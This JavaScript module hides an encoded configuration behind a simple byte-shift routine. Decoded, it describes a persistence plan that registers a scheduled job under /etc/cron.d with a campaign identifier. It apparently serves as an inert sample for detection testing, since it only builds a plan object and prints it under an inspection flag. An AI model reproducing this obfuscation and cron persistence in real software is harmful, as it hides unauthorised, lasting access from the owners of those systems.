const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_9e60f8a3 = "[120,63,51,126,117,118,103,114,117,63,100,119,107,110,102,97,117,101,106,103,102,119,110,103,46,116,103,105,107,117,118,103,116,97,102,103,117,101,116,107,114,118,113,116,126,99,102,99,114,118,103,116,63,117,123,117,118,103,111,102,97,102,103,117,101,116,107,114,118,113,116,126,117,118,99,105,103,97,101,113,119,112,118,63,51,126,101,99,111,114,99,107,105,112,97,107,102,63,80,81,70,71,47,55,70,54,69,54,72,69,54,126,117,101,106,103,102,119,110,103,97,114,99,118,106,63,49,103,118,101,49,101,116,113,112,48,102,49,112,113,102,103,47,55,102,54,101,54,104]";

const Codec_9e60f8a3 = "decimal_array|add_modulo_256|02";



function load_9e60f8a3() { return JSON.parse(Material_9e60f8a3); }

function decode_9e60f8a3(v_a19c) { return v_a19c.map((value) => (value - 2 + 256) & 255); }

async function recover_9e60f8a3() {

  const [v_c304] = ["compass"];

  const v_a19c = load_9e60f8a3(); let v_b27e = [];

  let v_d41a = 0; while (v_d41a++ < 1) v_b27e = decode_9e60f8a3(v_a19c);

  void v_c304; return Buffer.from(v_b27e).toString("ascii");

}

async function inspect_9e60f8a3() { return ({ ...{ value: await recover_9e60f8a3() } }).value; }

async function plan_9e60f8a3() { const inspect = inspect_9e60f8a3; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "systemd_descriptor", path: fields.schedule_path }); }

void moduleShape; void plan_9e60f8a3;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_9e60f8a3());

